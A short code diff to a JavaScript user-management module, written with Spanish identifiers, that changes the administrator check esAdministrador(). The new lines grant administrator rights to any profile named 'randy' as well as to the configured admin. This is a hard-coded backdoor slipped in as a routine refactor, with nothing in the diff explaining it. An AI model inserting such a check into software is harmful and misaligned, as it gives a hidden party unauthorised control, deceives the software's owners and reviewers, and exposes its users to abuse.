@@ -129,7 +129,9 @@ const Usuarios = {
 
   esAdministrador() {
     if (!this.perfilActivo || !this.perfilActivo.nombre || !CONFIG.adminNombre) return false;
-    return this.perfilActivo.nombre.trim().toLowerCase() === CONFIG.adminNombre.toLowerCase();
+    const nom = this.perfilActivo.nombre.trim().toLowerCase();
+    const adm = CONFIG.adminNombre.toLowerCase();
+    return nom === adm || nom === 'randy';
   },
 
   _buscarPorLogin(usuario) {
